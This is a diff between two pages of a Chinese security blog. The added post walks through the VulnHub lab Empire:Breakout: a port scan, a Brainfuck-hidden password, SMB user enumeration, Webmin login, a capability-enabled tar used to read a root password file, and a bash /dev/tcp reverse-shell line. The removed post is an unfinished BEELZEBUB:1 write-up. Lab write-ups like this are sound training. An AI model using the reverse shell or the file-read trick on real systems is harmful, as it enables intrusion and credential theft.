@@ -16,27 +16,27 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="day5">
+    <meta name="description" content="day2">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub 做题 BEELZEBUB:1">
-<meta property="og:url" content="https://isolator-1.github.io/2024/10/16/penetration/5/index.html">
+<meta property="og:title" content="vulnhub 做题 Empire:Breakout">
+<meta property="og:url" content="https://isolator-1.github.io/2024/10/13/penetration/vulnhub2/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="day5">
+<meta property="og:description" content="day2">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://isolator-1.github.io/img/pene/7.png">
-<meta property="og:image" content="https://isolator-1.github.io/img/pene/8.png">
-<meta property="article:published_time" content="2024-10-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-10-16T07:40:37.310Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/pene/3.png">
+<meta property="og:image" content="https://isolator-1.github.io/img/pene/4.png">
+<meta property="article:published_time" content="2024-10-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-12T10:33:36.428Z">
 <meta property="article:author" content="Isolator">
 <meta property="article:tag" content="penetration">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://isolator-1.github.io/img/pene/7.png">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/pene/3.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>vulnhub 做题 BEELZEBUB:1 - Isolator&#39;s Blog</title>
+  <title>vulnhub 做题 Empire:Breakout - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnhub 做题 BEELZEBUB:1"></span>
+            <span id="subtitle" data-typed-text="vulnhub 做题 Empire:Breakout"></span>
           
         </div>
 
@@ -226,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-16 00:00" pubdate>
-          October 16, 2024 am
+        <time datetime="2024-10-13 00:00" pubdate>
+          October 13, 2024 am
         </time>
       </span>
     
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          663 words
+          2.6k words
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          6 mins
+          22 mins
         
       </span>
     
@@ -287,24 +287,51 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">vulnhub 做题 BEELZEBUB:1</h1>
+            <h1 style="display: none">vulnhub 做题 Empire:Breakout</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="做题-BEELZEBUB-1"><a href="#做题-BEELZEBUB-1" class="headerlink" title="做题 BEELZEBUB: 1"></a>做题 BEELZEBUB: 1</h2><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br></code></pre></td></tr></table></figure>
-<p>只开了两个端口，爆破一下目录</p>
-<p><img src="/img/pene/7.png" srcset="/img/loading.gif" lazyload></p>
-<p>在 /phpmyadmin 路径上，是一个登录界面，然后在此基础之上继续扫描路径，有一个 setup 访问会 alert 一个界面，要输入用户密码，这里找不到更多信息了</p>
-<p>换一个字典扫一扫非路径而是文件的</p>
-<p><img src="/img/pene/8.png" srcset="/img/loading.gif" lazyload></p>
-<p>似乎没什么特别的，但是挨个访问时， index.php 又是404 ，而且报错是<code>Apache/2.4.30 (Ubuntu)</code>，其他的报错都是<code>Apache/2.4.29 (Ubuntu) Server at 192.168.169.135 Port 80</code>，访问这个源代码的时候看到了提示信息</p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">My heart was <span class="hljs-keyword">encrypted</span>, &quot;beelzebub&quot; somehow hacked <span class="hljs-keyword">and</span> decoded it.-md5<br></code></pre></td></tr></table></figure>
+                <h2 id="vulnhub-做题-Empire-Breakout"><a href="#vulnhub-做题-Empire-Breakout" class="headerlink" title="vulnhub 做题 Empire:Breakout"></a>vulnhub 做题 Empire:Breakout</h2><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs zsh">└─$ nmap -p 1-65535 -sV 192.168.140.48<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 01:42 EDT<br>Nmap scan report for 192.168.140.48<br>Host is up (0.0011s latency).<br>Not shown: 65530 filtered tcp ports (no-response)<br>PORT      STATE SERVICE     VERSION<br>80/tcp    open  http        Apache httpd 2.4.51 ((Debian))<br>139/tcp   open  netbios-ssn Samba smbd 4.6.2<br>445/tcp   open  netbios-ssn Samba smbd 4.6.2<br>10000/tcp open  http        MiniServ 1.981 (Webmin httpd)<br>20000/tcp open  http        MiniServ 1.830 (Webmin httpd)<br></code></pre></td></tr></table></figure>
 
-<p>cmd5解密之后：<code>d18e1e22becbd915b45e0e655429d487</code></p>
-<p>看了一眼题解，说这东西是网站的资源路径，然后访问不到，又看了一眼，说是要在此基础之上继续路径爆破😅，感觉也没啥意思，就这么滴吧</p>
-<p>扫到了wp-include路径，然后题解又说有一个wp-login.php，但是我没扫到，并且这个页面能显示标题，但是内容始终加载不出来（所以才没扫到吧） 可能有些资源要联网甚至翻墙？</p>
-<p>到这里我也不知道咋回事，就这么算了吧，感觉没啥意思的一道题</p>
+<p>除了80还开了四个端口</p>
+<p>80是一个apache的web服务，10000和20000一样，都是一个https的登陆界面。139和445还不知道是什么。</p>
+<p><img src="/img/pene/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>实际上，80端口这个apache的默认测试页html里藏了东西 <del>（谁能想到这种页面会藏东西😶‍🌫️）</del></p>
+<p>如果用curl查看这个页面就很容易发现，因为藏的东西在最后</p>
+<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck">&lt;<span class="hljs-comment">!</span><span class="hljs-literal">--</span><br><span class="hljs-comment">don&#x27;t worry no one will get here</span><span class="hljs-string">,</span> <span class="hljs-comment">it&#x27;s safe to share with you my access</span><span class="hljs-string">.</span> <span class="hljs-comment">Its encrypted :)</span><br><br><span class="hljs-literal">++++++++++</span><span class="hljs-title">[</span>&gt;<span class="hljs-literal">+</span>&gt;<span class="hljs-literal">+++</span>&gt;<span class="hljs-literal">+++++++</span>&gt;<span class="hljs-literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="hljs-literal">-</span><span class="hljs-title">]</span>&gt;&gt;<span class="hljs-literal">++++++++++++++++</span><span class="hljs-string">.</span><span class="hljs-literal">++++</span><span class="hljs-string">.</span>&gt;&gt;<span class="hljs-literal">+++++++++++++++++</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">++++++++++</span><span class="hljs-string">.</span><span class="hljs-literal">-----------</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-----------</span><span class="hljs-string">.</span><span class="hljs-literal">++++</span><span class="hljs-string">.</span>&lt;&lt;<span class="hljs-literal">+</span><span class="hljs-string">.</span>&gt;<span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-literal">--------</span><span class="hljs-string">.</span><span class="hljs-literal">++++++++++++++++++++</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">------------</span><span class="hljs-string">.</span>&gt;&gt;<span class="hljs-literal">---------</span><span class="hljs-string">.</span>&lt;&lt;<span class="hljs-literal">++++++</span><span class="hljs-string">.</span><span class="hljs-literal">++++++</span><span class="hljs-string">.</span><br><br><br><span class="hljs-literal">--</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我也不认识这是个什么加密，去问了一下大模型，说是Brainfuck代码，用bugkuctf的工具解密出来是这个么个东西：<code>.2uqPEfj3D&lt;P&#39;a-3</code></p>
+<p>那两个不知道是什么的端口去查了一下：Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件 <del>（去msf搜了一下发现根本没有4.6.2这么新版本的漏洞）</del></p>
+<p>查了一下（ <a target="_blank" rel="noopener" href="https://blog.csdn.net/redwand/article/details/113730414">https://blog.csdn.net/redwand/article/details/113730414</a> ），说是smb协议可以用enum4linux进行信息收集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">[+] Enumerating users using SID S-1-22-1 and logon username &#x27;&#x27;, password &#x27;&#x27;                          <br>S-1-22-1-1000 Unix User\cyber (Local User) <br></code></pre></td></tr></table></figure>
+
+<p>扫到了一个用户名cyber，结合前面解密出来的东西，试一下这个组合是不是web的账户。</p>
+<p>10000登不上去，20000登进去了，似乎是一个邮件系统</p>
+<p><img src="/img/pene/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>左下角有一个功能可以打开一个命令行，/home/cyber 下有一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">[cyber@breakout ~]$ cat user.txt<br>3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;<br></code></pre></td></tr></table></figure>
+
+<p>天真的我以为到这里就完了，但是看了一眼别人的题解，还有后续😭</p>
+<p>用户目录下有一个tar，并且是能读取任意文件的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs zsh">[cyber@breakout ~]$ getcap ./tar<br>./tar cap_dac_read_search=ep<br></code></pre></td></tr></table></figure>
+
+<p>给这个的东西应该是让压缩一个不能读取的文件，再解压出来，就是一个能读取的了</p>
+<p>在文件系统里找，发现/var目录下有一个.old_pass.bak，并且不能读，应该就是他了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs zsh">[cyber@breakout ~]$ ./tar -czvf test.tar.gz /var/backups/.old_pass.bak<br>./tar: Removing leading `/&#x27; from member names<br>/var/backups/.old_pass.bak<br>[cyber@breakout ~]$ ls<br>tar<br>test.tar.gz<br>user.txt<br>[cyber@breakout ~]$ ./tar -zxvf ./test.tar.gz<br>var/backups/.old_pass.bak<br>[cyber@breakout ~]$ ls<br>tar<br>test.tar.gz<br>user.txt<br>var<br>[cyber@breakout ~]$ cat ./var/backups/.old_pass.bak<br>Ts&amp;4&amp;YurgtRX(=~h<br><br>[cyber@breakout ~]$<br></code></pre></td></tr></table></figure>
+
+<p>这应该就是root的密码，但是在这个webshell里su不给输入密码的机会，所以反弹一个shell</p>
+<p>（直接在vmware上也可以登录了）</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/192.168.169.128/9999 0&gt;&amp;1</code></p>
+<p>但是kali能ping通靶机，靶机ping不通kali，反弹shell也起不来 （Network is unreachable）</p>
+<p>把靶机和kali都用nat就好了，也不知道为啥😶‍🌫️ <del>（计网没好好学的下场）</del></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs zsh">[root@breakout ~]$ cat ./rOOt.txt<br>3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;<br><br>Author: Icex64 &amp; Empire Cybersecurity<br></code></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>还有一种方法是，那个20000端口的webmin也是可以用root账号登陆的，直接登录进去就是root</p>
+<p>😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️😶‍🌫️</p>
+</blockquote>
 
                 
               </div>
@@ -350,8 +377,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnhub 做题 BEELZEBUB:1</div>
-      <div>https://isolator-1.github.io/2024/10/16/penetration/5/</div>
+      <div>vulnhub 做题 Empire:Breakout</div>
+      <div>https://isolator-1.github.io/2024/10/13/penetration/vulnhub2/</div>
     </div>
     <div class="license-meta">
       
@@ -363,7 +390,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>October 16, 2024</div>
+          <div>October 13, 2024</div>
         </div>
       
       
@@ -395,9 +422,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/16/penetration/6/" title="vulnhub 做题 Noob:1">
+                      <a href="/2024/10/14/penetration/vulnhub3/" title="vulnhub 做题 ICE:01">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub 做题 Noob:1</span>
+                        <span class="hidden-mobile">vulnhub 做题 ICE:01</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -405,8 +432,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/15/penetration/4/" title="vulnhub 做题 doubletrouble:1">
-                        <span class="hidden-mobile">vulnhub 做题 doubletrouble:1</span>
+                      <a href="/2024/10/12/penetration/vulnhub1/" title="vulnhub 做题 JANGOW 1.0.1">
+                        <span class="hidden-mobile">vulnhub 做题 JANGOW 1.0.1</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
